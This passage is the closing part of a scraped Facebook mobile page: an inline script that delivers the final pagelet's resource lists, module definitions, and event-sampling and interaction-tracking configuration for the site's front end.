                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/6KqFq7q8hV0.js?_nc_x=Ij3Wp8lg5Kz"
                        }
                    },
                    allResources: ["BYBRF", "yRNCI", "zgN4d", "Ksyvg", "n4L+p", "kP52c", "2vYSp", "S0evd", "93rXf", "rIIyA", "X1lbp", "FEt5G"],
                    displayResources: ["BYBRF", "yRNCI", "zgN4d", "Ksyvg", "2vYSp", "S0evd", "rIIyA", "X1lbp"],
                    onload: ["CavalryLogger.getInstance(\"6812558644291207214-0\").setTTIEvent(\"t_domcontent\");"],
                    onafterload: ["window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp(\"t_paint\");", "if (window.ExitTime){CavalryLogger.getInstance(\"6812558644291207214-0\").setValue(\"t_exit\", window.ExitTime);};"],
                    id: "last_response",
                    phase: 63,
                    jsmods: {
                        require: [["NavigationMetrics", "setPage", [], [{
                            page: "/wap/index.php",
                            page_type: "normal",
                            page_uri: "https://m.facebook.com/",
                            serverLID: "6812558644291207214-0"
                        }]], ["CavalryLoggerImpl", "startInstrumentation", [], []], ["Artillery", "disable", [], []], ["ArtilleryOnUntilOffLogging", "disable", [], []], ["ArtilleryRequestDataCollection", "disable", [], ["6812558644291207214-0"]], ["ServiceWorkerURLCleaner", "removeRedirectID", [], []]],
                        define: [["BrowserPushPubKey", [], {
                            appServerKey: ""
                        }, 4806], ["BrowserPaymentHandlerConfig", [], {
                            enabled: false
                        }, 3904], ["MTouchableSyntheticClickGK", [], {
                            USE_SYNTHETIC_CLICK: true
                        }, 368], ["cr:1109759", ["CookieConsentBlacklist"], {
                            __rc: ["CookieConsentBlacklist", "Aa1cKNJ5KDe29Wca-ihHSd1ViFsVzYiH18VNJxLtJaY46zoTCMiv1ntWZ5P7Phboehz-jhgmt7qAXG7v3LdOFWA"]
                        }, -1], ["cr:1083116", ["XAsyncRequest"], {
                            __rc: ["XAsyncRequest", "Aa1cKNJ5KDe29Wca-ihHSd1ViFsVzYiH18VNJxLtJaY46zoTCMiv1ntWZ5P7Phboehz-jhgmt7qAXG7v3LdOFWA"]
                        }, -1], ["cr:1069930", [], {
                            __rc: [null, "Aa1cKNJ5KDe29Wca-ihHSd1ViFsVzYiH18VNJxLtJaY46zoTCMiv1ntWZ5P7Phboehz-jhgmt7qAXG7v3LdOFWA"]
                        }, -1], ["cr:1083117", [], {
                            __rc: [null, "Aa1cKNJ5KDe29Wca-ihHSd1ViFsVzYiH18VNJxLtJaY46zoTCMiv1ntWZ5P7Phboehz-jhgmt7qAXG7v3LdOFWA"]
                        }, -1], ["cr:708886", ["EventProfilerImpl"], {
                            __rc: ["EventProfilerImpl", "Aa1cKNJ5KDe29Wca-ihHSd1ViFsVzYiH18VNJxLtJaY46zoTCMiv1ntWZ5P7Phboehz-jhgmt7qAXG7v3LdOFWA"]
                        }, -1], ["EventConfig", [], {
                            sampling: {
                                bandwidth: 0,
                                play: 0,
                                playing: 0,
                                progress: 0,
                                pause: 0,
                                ended: 0,
                                seeked: 0,
                                seeking: 0,
                                waiting: 0,
                                loadedmetadata: 0,
                                canplay: 0,
                                selectionchange: 0,
                                change: 0,
                                timeupdate: 2000000,
                                adaptation: 0,
                                focus: 0,
                                blur: 0,
                                load: 0,
                                error: 0,
                                message: 0,
                                abort: 0,
                                storage: 0,
                                scroll: 200000,
                                mousemove: 20000,
                                mouseover: 10000,
                                mouseout: 10000,
                                mousewheel: 1,
                                MSPointerMove: 10000,
                                keydown: 0.1,
                                click: 0.02,
                                mouseup: 0.02,
                                __100ms: 0.001,
                                __default: 5000,
                                __min: 100,
                                __interactionDefault: 200,
                                __eventDefault: 100000
                            },
                            page_sampling_boost: 1,
                            interaction_regexes: {
                                BlueBarAccountChevronMenu: " _5lxs(?: .*)?$",
                                BlueBarHomeButton: " _bluebarLinkHome__interaction-root(?: .*)?$",
                                BlueBarProfileLink: " _1k67(?: .*)?$",
                                ReactComposerSproutMedia: " _1pnt(?: .*)?$",
                                ReactComposerSproutAlbum: " _1pnu(?: .*)?$",
                                ReactComposerSproutNote: " _3-9x(?: .*)?$",
                                ReactComposerSproutLocation: " _1pnv(?: .*)?$",
                                ReactComposerSproutActivity: " _1pnz(?: .*)?$",
                                ReactComposerSproutPeople: " _1pn-(?: .*)?$",
                                ReactComposerSproutLiveVideo: " _5tv7(?: .*)?$",
                                ReactComposerSproutMarkdown: " _311p(?: .*)?$",
                                ReactComposerSproutFormattedText: " _mwg(?: .*)?$",
                                ReactComposerSproutSticker: " _2vri(?: .*)?$",
                                ReactComposerSproutSponsor: " _5t5q(?: .*)?$",
                                ReactComposerSproutEllipsis: " _1gr3(?: .*)?$",
                                ReactComposerSproutContactYourRepresentative: " _3cnv(?: .*)?$",
                                ReactComposerSproutFunFact: " _2_xs(?: .*)?$",
                                TextExposeSeeMoreLink: " see_more_link(?: .*)?$",
                                SnowliftBigCloseButton: "(?: _xlt(?: .*)? _418x(?: .*)?$| _418x(?: .*)? _xlt(?: .*)?$)",
                                SnowliftPrevPager: "(?: snowliftPager(?: .*)? prev(?: .*)?$| prev(?: .*)? snowliftPager(?: .*)?$)",
                                SnowliftNextPager: "(?: snowliftPager(?: .*)? next(?: .*)?$| next(?: .*)? snowliftPager(?: .*)?$)",
                                SnowliftFullScreenButton: "#fbPhotoSnowliftFullScreenSwitch( .+)*",
                                PrivacySelectorMenu: "(?: _57di(?: .*)? _2wli(?: .*)?$| _2wli(?: .*)? _57di(?: .*)?$)",
                                ReactComposerFeedXSprouts: " _nh6(?: .*)?$",
                                SproutsComposerStatusTab: " _sg1(?: .*)?$",
                                SproutsComposerLiveVideoTab: " _sg1(?: .*)?$",
                                SproutsComposerAlbumTab: " _sg1(?: .*)?$",
                                composerAudienceSelector: " _ej0(?: .*)?$",
                                FeedHScrollAttachmentsPrevPager: " _1qqy(?: .*)?$",
                                FeedHScrollAttachmentsNextPager: " _1qqz(?: .*)?$",
                                DockChatTabFlyout: " fbDockChatTabFlyout(?: .*)?$",
                                PrivacyLiteJewel: " _59fc(?: .*)?$",
                                ActorSelector: " _6vh(?: .*)?$",
                                LegacyMentionsInput: "(?: ReactLegacyMentionsInput(?: .*)? uiMentionsInput(?: .*)? _2xwx(?: .*)?$| uiMentionsInput(?: .*)? ReactLegacyMentionsInput(?: .*)? _2xwx(?: .*)?$| _2xwx(?: .*)? ReactLegacyMentionsInput(?: .*)? uiMentionsInput(?: .*)?$| ReactLegacyMentionsInput(?: .*)? _2xwx(?: .*)? uiMentionsInput(?: .*)?$| uiMentionsInput(?: .*)? _2xwx(?: .*)? ReactLegacyMentionsInput(?: .*)?$| _2xwx(?: .*)? uiMentionsInput(?: .*)? ReactLegacyMentionsInput(?: .*)?$)",
                                UFIActionLinksEmbedLink: " _2g1w(?: .*)?$",
                                UFIPhotoAttachLink: " UFIPhotoAttachLinkWrapper(?: .*)?$",
                                UFIMentionsInputProxy: " _1osa(?: .*)?$",
                                UFIMentionsInputDummy: " _1osc(?: .*)?$",
                                UFIOrderingModeSelector: " _3scp(?: .*)?$",
                                UFIPager: "(?: UFIPagerRow(?: .*)? UFIRow(?: .*)?$| UFIRow(?: .*)? UFIPagerRow(?: .*)?$)",
                                UFIReplyRow: "(?: UFIReplyRow(?: .*)? UFICommentReply(?: .*)?$| UFICommentReply(?: .*)? UFIReplyRow(?: .*)?$)",
                                UFIReplySocialSentence: " UFIReplySocialSentenceRow(?: .*)?$",
                                UFIShareLink: " _5f9b(?: .*)?$",
                                UFIStickerButton: " UFICommentStickerButton(?: .*)?$",
                                MentionsInput: " _5yk1(?: .*)?$",
                                FantaChatTabRoot: " _3_9e(?: .*)?$",
                                SnowliftViewableRoot: " _2-sx(?: .*)?$",
                                ReactBlueBarJewelButton: " _5fwr(?: .*)?$",
                                UFIReactionsDialogLayerImpl: " _1oxk(?: .*)?$",
                                UFIReactionsLikeLinkImpl: " _4x9_(?: .*)?$",
                                UFIReactionsLinkImplRoot: " _khz(?: .*)?$",
                                Reaction: " _iuw(?: .*)?$",
                                UFIReactionsMenuImpl: " _iu-(?: .*)?$",
                                UFIReactionsSpatialReactionIconContainer: " _1fq9(?: .*)?$",
                                VideoComponentPlayButton: " _bsl(?: .*)?$",
                                FeedOptionsPopover: " _b1e(?: .*)?$",
                                UFICommentLikeCount: " UFICommentLikeButton(?: .*)?$",
                                UFICommentLink: " _5yxe(?: .*)?$",
                                ChatTabComposerInputContainer: " _552h(?: .*)?$",
                                ChatTabHeader: " _15p4(?: .*)?$",
                                DraftEditor: " _5rp7(?: .*)?$",
                                ChatSideBarDropDown: " _5vm9(?: .*)?$",
                                SearchBox: " _539-(?: .*)?$",
                                ChatSideBarLink: " _55ln(?: .*)?$",
                                MessengerSearchTypeahead: " _3rh8(?: .*)?$",
                                NotificationListItem: " _33c(?: .*)?$",
                                MessageJewelListItem: " messagesContent(?: .*)?$",
                                Messages_Jewel_Button: " _3eo8(?: .*)?$",
                                Notifications_Jewel_Button: " _3eo9(?: .*)?$",
                                snowliftopen: " _342u(?: .*)?$",
                                NoteTextSeeMoreLink: " _3qd_(?: .*)?$",
                                fbFeedOptionsPopover: " _1he6(?: .*)?$",
                                Requests_Jewel_Button: " _3eoa(?: .*)?$",
                                UFICommentActionLinkAjaxify: " _15-3(?: .*)?$",
                                UFICommentActionLinkRedirect: " _15-6(?: .*)?$",
                                UFICommentActionLinkDispatched: " _15-7(?: .*)?$",
                                UFICommentCloseButton: " _36rj(?: .*)?$",
                                UFICommentActionsRemovePreview: " _460h(?: .*)?$",
                                UFICommentActionsReply: " _460i(?: .*)?$",
                                UFICommentActionsSaleItemMessage: " _460j(?: .*)?$",
                                UFICommentActionsAcceptAnswer: " _460k(?: .*)?$",
                                UFICommentActionsUnacceptAnswer: " _460l(?: .*)?$",
                                UFICommentReactionsLikeLink: " _3-me(?: .*)?$",
                                UFICommentMenu: " _1-be(?: .*)?$",
                                UFIMentionsInputFallback: " _289b(?: .*)?$",
                                UFIMentionsInputComponent: " _289c(?: .*)?$",
                                UFIMentionsInputProxyInput: " _432z(?: .*)?$",
                                UFIMentionsInputProxyDummy: " _432-(?: .*)?$",
                                UFIPrivateReplyLinkMessage: " _14hj(?: .*)?$",
                                UFIPrivateReplyLinkSeeReply: " _14hk(?: .*)?$",
                                ChatCloseButton: " _4vu4(?: .*)?$",
                                ChatTabComposerPhotoUploader: " _13f-(?: .*)?$",
                                ChatTabComposerGroupPollingButton: " _13f_(?: .*)?$",
                                ChatTabComposerGames: " _13ga(?: .*)?$",
                                ChatTabComposerPlan: " _13gb(?: .*)?$",
                                ChatTabComposerFileUploader: " _13gd(?: .*)?$",
                                ChatTabStickersButton: " _13ge(?: .*)?$",
                                ChatTabComposerGifButton: " _13gf(?: .*)?$",
                                ChatTabComposerEmojiPicker: " _13gg(?: .*)?$",
                                ChatTabComposerLikeButton: " _13gi(?: .*)?$",
                                ChatTabComposerP2PButton: " _13gj(?: .*)?$",
                                ChatTabComposerQuickCam: " _13gk(?: .*)?$",
                                ChatTabHeaderAudioRTCButton: " _461a(?: .*)?$",
                                ChatTabHeaderVideoRTCButton: " _461b(?: .*)?$",
                                ChatTabHeaderOptionsButton: " _461_(?: .*)?$",
                                ChatTabHeaderAddToThreadButton: " _4620(?: .*)?$",
                                ReactComposerMediaSprout: " _fk5(?: .*)?$",
                                UFIReactionsBlingSocialSentenceComments: " _-56(?: .*)?$",
                                UFIReactionsBlingSocialSentenceSeens: " _2x0l(?: .*)?$",
                                UFIReactionsBlingSocialSentenceShares: " _2x0m(?: .*)?$",
                                UFIReactionsBlingSocialSentenceViews: " _-5c(?: .*)?$",
                                UFIReactionsBlingSocialSentence: " _-5d(?: .*)?$",
                                UFIReactionsSocialSentence: " _1vaq(?: .*)?$",
                                VideoFullscreenButton: " _39ip(?: .*)?$",
                                Tahoe: " _400z(?: .*)?$",
                                TahoeFromVideoPlayer: " _1vek(?: .*)?$",
                                TahoeFromVideoLink: " _2-40(?: .*)?$",
                                TahoeFromPhoto: " _2ju5(?: .*)?$",
                                FBStoryTrayItem: " _1fvw(?: .*)?$",
                                Mobile_Feed_Jewel_Button: "#feed_jewel( .+)*",
                                Mobile_Requests_Jewel_Button: "#requests_jewel( .+)*",
                                Mobile_Messages_Jewel_Button: "#messages_jewel( .+)*",
                                Mobile_Notifications_Jewel_Button: "#notifications_jewel( .+)*",
                                Mobile_Search_Jewel_Button: "#search_jewel( .+)*",
                                Mobile_Bookmarks_Jewel_Button: "#bookmarks_jewel( .+)*",
                                Mobile_Feed_UFI_Comment_Button_Permalink: " _l-a(?: .*)?$",
                                Mobile_Feed_UFI_Comment_Button_Flyout: " _4qeq(?: .*)?$",
                                Mobile_Feed_UFI_Token_Bar_Flyout: " _4qer(?: .*)?$",
                                Mobile_Feed_UFI_Token_Bar_Permalink: " _4-09(?: .*)?$",
                                Mobile_UFI_Share_Button: " _15kr(?: .*)?$",
                                Mobile_Feed_Photo_Permalink: " _1mh-(?: .*)?$",
                                Mobile_Feed_Video_Permalink: " _65g_(?: .*)?$",
                                Mobile_Feed_Profile_Permalink: " _4kk6(?: .*)?$",
                                Mobile_Feed_Story_Permalink: " _26yo(?: .*)?$",
                                Mobile_Feed_Page_Permalink: " _4e81(?: .*)?$",
                                Mobile_Feed_Group_Permalink: " _20u1(?: .*)?$",
                                Mobile_Feed_Event_Permalink: " _20u0(?: .*)?$",
                                ProfileIntroCardAddFeaturedMedia: " _30qr(?: .*)?$",
                                ProfileSectionAbout: " _84wb(?: .*)?$",
                                ProfileSectionAllRelationships: " _84wc(?: .*)?$",
                                ProfileSectionAtWork: " _2fnv(?: .*)?$",
                                ProfileSectionContactBasic: " _84vf(?: .*)?$",
                                ProfileSectionEducation: " _84vh(?: .*)?$",
                                ProfileSectionOverview: " _84vj(?: .*)?$",
                                ProfileSectionPlaces: " _84vg(?: .*)?$",
                                ProfileSectionYearOverviews: " _84vi(?: .*)?$",
                                IntlPolyglotHomepage: " _Interaction__IntlPolyglotVoteActivityCardButton(?: .*)?$",
                                ProtonElementSelection: " _67ft(?: .*)?$"
                            },
                            interaction_boost: {
                                SnowliftPrevPager: 0.2,
                                SnowliftNextPager: 0.2,
                                ChatSideBarLink: 2,
                                MessengerSearchTypeahead: 2,
                                Messages_Jewel_Button: 2.5,
                                Notifications_Jewel_Button: 1.5,
                                Tahoe: 30,
                                ProtonElementSelection: 4
                            },
                            event_types: {
                                BlueBarAccountChevronMenu: ["click"],
                                BlueBarHomeButton: ["click"],
                                BlueBarProfileLink: ["click"],
                                ReactComposerSproutMedia: ["click"],
                                ReactComposerSproutAlbum: ["click"],
                                ReactComposerSproutNote: ["click"],
                                ReactComposerSproutLocation: ["click"],
                                ReactComposerSproutActivity: ["click"],
                                ReactComposerSproutPeople: ["click"],
                                ReactComposerSproutLiveVideo: ["click"],
                                ReactComposerSproutMarkdown: ["click"],
                                ReactComposerSproutFormattedText: ["click"],
                                ReactComposerSproutSticker: ["click"],
                                ReactComposerSproutSponsor: ["click"],
                                ReactComposerSproutEllipsis: ["click"],
                                ReactComposerSproutContactYourRepresentative: ["click"],
                                ReactComposerSproutFunFact: ["click"],
                                TextExposeSeeMoreLink: ["click"],
                                SnowliftBigCloseButton: ["click"],
                                SnowliftPrevPager: ["click"],
                                SnowliftNextPager: ["click"],
                                SnowliftFullScreenButton: ["click"],
                                PrivacySelectorMenu: ["click"],
                                ReactComposerFeedXSprouts: ["click"],
                                SproutsComposerStatusTab: ["click"],
                                SproutsComposerLiveVideoTab: ["click"],
                                SproutsComposerAlbumTab: ["click"],
                                composerAudienceSelector: ["click"],
                                FeedHScrollAttachmentsPrevPager: ["click"],
                                FeedHScrollAttachmentsNextPager: ["click"],
                                DockChatTabFlyout: ["click"],
                                PrivacyLiteJewel: ["click"],
                                ActorSelector: ["click"],
                                LegacyMentionsInput: ["click"],
                                UFIActionLinksEmbedLink: ["click"],
                                UFIPhotoAttachLink: ["click"],
                                UFIMentionsInputProxy: ["click"],
                                UFIMentionsInputDummy: ["click"],
                                UFIOrderingModeSelector: ["click"],
                                UFIPager: ["click"],
                                UFIReplyRow: ["click"],
                                UFIReplySocialSentence: ["click"],
                                UFIShareLink: ["click"],
                                UFIStickerButton: ["click"],
                                MentionsInput: ["click"],
                                FantaChatTabRoot: ["click"],
                                SnowliftViewableRoot: ["click"],
                                ReactBlueBarJewelButton: ["click"],
                                UFIReactionsDialogLayerImpl: ["click"],
                                UFIReactionsLikeLinkImpl: ["click"],
                                UFIReactionsLinkImplRoot: ["click"],
                                Reaction: ["click"],
                                UFIReactionsMenuImpl: ["click"],
                                UFIReactionsSpatialReactionIconContainer: ["click"],
                                VideoComponentPlayButton: ["click"],
                                FeedOptionsPopover: ["click"],
                                UFICommentLikeCount: ["click"],
                                UFICommentLink: ["click"],
                                ChatTabComposerInputContainer: ["click"],
                                ChatTabHeader: ["click"],
                                DraftEditor: ["click"],
                                ChatSideBarDropDown: ["click"],
                                SearchBox: ["click"],
                                ChatSideBarLink: ["mouseup"],
                                MessengerSearchTypeahead: ["click"],
                                NotificationListItem: ["click"],
                                MessageJewelListItem: ["click"],
                                Messages_Jewel_Button: ["click"],
                                Notifications_Jewel_Button: ["click"],
                                snowliftopen: ["click"],
                                NoteTextSeeMoreLink: ["click"],
                                fbFeedOptionsPopover: ["click"],
                                Requests_Jewel_Button: ["click"],
                                UFICommentActionLinkAjaxify: ["click"],
                                UFICommentActionLinkRedirect: ["click"],
                                UFICommentActionLinkDispatched: ["click"],
                                UFICommentCloseButton: ["click"],
                                UFICommentActionsRemovePreview: ["click"],
                                UFICommentActionsReply: ["click"],
                                UFICommentActionsSaleItemMessage: ["click"],
                                UFICommentActionsAcceptAnswer: ["click"],
                                UFICommentActionsUnacceptAnswer: ["click"],
                                UFICommentReactionsLikeLink: ["click"],
                                UFICommentMenu: ["click"],
                                UFIMentionsInputFallback: ["click"],
                                UFIMentionsInputComponent: ["click"],
                                UFIMentionsInputProxyInput: ["click"],
                                UFIMentionsInputProxyDummy: ["click"],
                                UFIPrivateReplyLinkMessage: ["click"],
                                UFIPrivateReplyLinkSeeReply: ["click"],
                                ChatCloseButton: ["click"],
                                ChatTabComposerPhotoUploader: ["click"],
                                ChatTabComposerGroupPollingButton: ["click"],
                                ChatTabComposerGames: ["click"],
                                ChatTabComposerPlan: ["click"],
                                ChatTabComposerFileUploader: ["click"],
                                ChatTabStickersButton: ["click"],
                                ChatTabComposerGifButton: ["click"],
                                ChatTabComposerEmojiPicker: ["click"],
                                ChatTabComposerLikeButton: ["click"],
                                ChatTabComposerP2PButton: ["click"],
                                ChatTabComposerQuickCam: ["click"],
                                ChatTabHeaderAudioRTCButton: ["click"],
                                ChatTabHeaderVideoRTCButton: ["click"],
                                ChatTabHeaderOptionsButton: ["click"],
                                ChatTabHeaderAddToThreadButton: ["click"],
                                ReactComposerMediaSprout: ["click"],
                                UFIReactionsBlingSocialSentenceComments: ["click"],
                                UFIReactionsBlingSocialSentenceSeens: ["click"],
                                UFIReactionsBlingSocialSentenceShares: ["click"],
                                UFIReactionsBlingSocialSentenceViews: ["click"],
                                UFIReactionsBlingSocialSentence: ["click"],
                                UFIReactionsSocialSentence: ["click"],
                                VideoFullscreenButton: ["click"],
                                Tahoe: ["click"],
                                TahoeFromVideoPlayer: ["click"],
                                TahoeFromVideoLink: ["click"],
                                TahoeFromPhoto: ["click"],
                                "": ["click"],
                                FBStoryTrayItem: ["click"],
                                Mobile_Feed_Jewel_Button: ["click"],
                                Mobile_Requests_Jewel_Button: ["click"],
                                Mobile_Messages_Jewel_Button: ["click"],
                                Mobile_Notifications_Jewel_Button: ["click"],
                                Mobile_Search_Jewel_Button: ["click"],
                                Mobile_Bookmarks_Jewel_Button: ["click"],
                                Mobile_Feed_UFI_Comment_Button_Permalink: ["click"],
                                Mobile_Feed_UFI_Comment_Button_Flyout: ["click"],
                                Mobile_Feed_UFI_Token_Bar_Flyout: ["click"],
                                Mobile_Feed_UFI_Token_Bar_Permalink: ["click"],
                                Mobile_UFI_Share_Button: ["click"],
                                Mobile_Feed_Photo_Permalink: ["click"],
                                Mobile_Feed_Video_Permalink: ["click"],
                                Mobile_Feed_Profile_Permalink: ["click"],
                                Mobile_Feed_Story_Permalink: ["click"],
                                Mobile_Feed_Page_Permalink: ["click"],
                                Mobile_Feed_Group_Permalink: ["click"],
                                Mobile_Feed_Event_Permalink: ["click"],
                                ProfileIntroCardAddFeaturedMedia: ["click"],
                                ProfileSectionAbout: ["click"],
                                ProfileSectionAllRelationships: ["click"],
                                ProfileSectionAtWork: ["click"],
                                ProfileSectionContactBasic: ["click"],
                                ProfileSectionEducation: ["click"],
                                ProfileSectionOverview: ["click"],
                                ProfileSectionPlaces: ["click"],
                                ProfileSectionYearOverviews: ["click"],
                                IntlPolyglotHomepage: ["click"],
                                ProtonElementSelection: ["click"]
                            },
                            manual_instrumentation: false,
                            profile_eager_execution: true,
                            disable_heuristic: true,
                            disable_event_profiler: false
                        }, 1726], ["KillabyteProfilerConfig", [], {
                            htmlProfilerModule: null,
                            profilerModule: null,
                            depTypes: {
                                BL: "bl",
                                NON_BL: "non-bl"
                            }
                        }, 1145], ["QuicklingConfig", [], {
                            version: "1001948375;0;",
                            sessionLength: 20,
                            inactivePageRegex: "^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|.+\\.pdf$|.+/settings/)",
                            badRequestKeys: ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"],
                            logRefreshOverhead: false
                        }, 60]]
                    },
                    last_in_phase: true,
                    the_end: true
                });
            }
            ), "onPageletArrive last_response", {
                "root": true,
                "pagelet": "last_response"
            })();
        </script>
    </body>
</html>
